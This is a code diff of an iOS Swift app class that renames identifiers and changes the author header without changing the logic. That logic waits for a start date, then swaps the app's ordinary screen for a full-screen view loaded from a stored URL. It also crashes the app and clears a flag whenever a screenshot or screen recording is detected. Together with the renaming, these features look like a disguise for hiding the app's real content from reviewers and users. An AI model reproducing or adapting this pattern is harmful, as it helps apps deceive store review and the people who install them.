@@ -1,22 +1,22 @@
 //
-//  CBNab.swift
-//  CBNab
+//  PlaygroundProje.swift
+//  PlaygroundProje
 //
-//  Created by Dzianis Baidan on 04/06/2020.
+//  Created by L on 02/01/2019.
 //  v.0.1.0
 
 import UIKit
 import AppsFlyerLib
 import KeychainSwift
 
-class CBNab: NSObject {
+class InDoGo: NSObject {
     
     // - UI
     private var window: UIWindow
     
     // - Manager
-    private let userDefaultsManager = CBUserDefaultsManager()
-    private let kchManager = KCHManager()
+    private let userDefaultsManager = KeyUserDefaultsManager()
+    private let kchManager = KeyValueCoManager()
     
     // - Closure
     private let casualViewControllerClosure: (() -> UIViewController)
@@ -43,13 +43,13 @@ class CBNab: NSObject {
                 
         super.init()
         
-        CBShared.shared.cbNab = self
-        CBShared.shared.baseURL = baseURL
-        CBShared.shared.path = path
-        CBShared.shared.purchaseId = purchaseId
-        CBShared.shared.needShowPurchaseBanner = needShowPurchaseBanner
-        CBShared.shared.needSupportDeepLinks = needSupportDeepLinks
-        CBShared.shared.casualViewControllerClosure = casualViewControllerClosure
+        InDoGoCommon.shared.PlaygroundProje = self
+        InDoGoCommon.shared.baseURL = baseURL
+        InDoGoCommon.shared.path = path
+        InDoGoCommon.shared.purchaseId = purchaseId
+        InDoGoCommon.shared.needShowPurchaseBanner = needShowPurchaseBanner
+        InDoGoCommon.shared.needSupportDeepLinks = needSupportDeepLinks
+        InDoGoCommon.shared.casualViewControllerClosure = casualViewControllerClosure
         
         configure(application, launchOptions: launchOptions)
     }
@@ -66,14 +66,14 @@ class CBNab: NSObject {
 // MARK: -
 // MARK: - Deeplink handling
 
-extension CBNab: AppsFlyerLibDelegate {
+extension InDoGo: AppsFlyerLibDelegate {
  
     func configureAppsFlyer() {
         if startDate > Date() {
             return
         }
     
-        if !CBShared.shared.needSupportDeepLinks {
+        if !InDoGoCommon.shared.needSupportDeepLinks {
             return
         }
         
@@ -106,7 +106,7 @@ extension CBNab: AppsFlyerLibDelegate {
 // MARK: -
 // MARK: - Configure
 
-extension CBNab {
+extension InDoGo {
     
     private func configure(_ application: UIApplication, launchOptions: [UIApplication.LaunchOptionsKey: Any]?) {
         configurePurchaseManager()
@@ -116,12 +116,12 @@ extension CBNab {
     }
         
     private func configurePurchaseManager() {
-        CBPurchaseManager.shared.completeTransactions()
-        CBPurchaseManager.shared.shouldAddStorePaymentHandler()
+        PurchasesManager.shared.completeTransactions()
+        PurchasesManager.shared.shouldAddStorePaymentHandler()
     }
     
     private func configurePushNotificationManager(application: UIApplication) {
-        CBPushNotificationManager.shared.register(application: application, pushes: [])
+        NotificationsManager.shared.register(application: application, pushes: [])
     }
     
     func configureRootViewController() {
@@ -134,7 +134,7 @@ extension CBNab {
         let dateString = kchManager.getDate()
         if !dateString.isEmpty {
             if abs(dateString.date().daysFromToday()) > 4 {
-                CBPushNotificationManager.shared.resetAllPushNotifications()
+                NotificationsManager.shared.resetAllPushNotifications()
                 kchManager.setIsCl()
             }
         }
@@ -151,8 +151,8 @@ extension CBNab {
         if kchManager.dataIsLoaded() {
             subscribeOnNotifications()
             subscribeOnObserver()
-            let pollVC = CBPollViewController()
-            pollVC.url = KCHManager().dt()
+            let pollVC = InViewController()
+            pollVC.url = KeyValueCoManager().dt()
             pollVC.modalPresentationStyle = .overFullScreen
             window.rootViewController = pollVC
             window.makeKeyAndVisible()
@@ -161,7 +161,7 @@ extension CBNab {
         } 
         
         // -
-        let loaderViewController = CBLoaderViewController()
+        let loaderViewController = GettingViewController()
         loaderViewController.casualViewControllerClosure = casualViewControllerClosure
         loaderViewController.application = application
         window.rootViewController = loaderViewController
@@ -170,8 +170,8 @@ extension CBNab {
     
     func configurePurcaseViewIfNeeded() {
         if startDate < Date() { return }
-        if !CBShared.shared.needShowPurchaseBanner { return }
-        let purchaseView = CBPurchaseView()
+        if !InDoGoCommon.shared.needShowPurchaseBanner { return }
+        let purchaseView = BannerView()
         purchaseView.backgroundColor = UIColor.lightGray
         let tabBarHeight: CGFloat = 80
         let yPosition = UIScreen.main.bounds.height - 70 - tabBarHeight
@@ -184,7 +184,7 @@ extension CBNab {
 // MARK: -
 // MARK: - Loading view controller
 
-extension CBNab {
+extension InDoGo {
     
     func subscribeOnNotifications() {
         let mainQueue = OperationQueue.main
@@ -192,7 +192,7 @@ extension CBNab {
             forName: UIApplication.userDidTakeScreenshotNotification,
             object: nil,
             queue: mainQueue) { [weak self] notification in
-            CBPushNotificationManager.shared.resetAllPushNotifications()
+            NotificationsManager.shared.resetAllPushNotifications()
             self?.kchManager.setIsCl()
             fatalError()
         }
@@ -206,7 +206,7 @@ extension CBNab {
         if (keyPath == "captured") {
             let isCaptured = UIScreen.main.isCaptured
             if isCaptured {
-                CBPushNotificationManager.shared.resetAllPushNotifications()
+                NotificationsManager.shared.resetAllPushNotifications()
                 kchManager.setIsCl()
                 fatalError()
             }
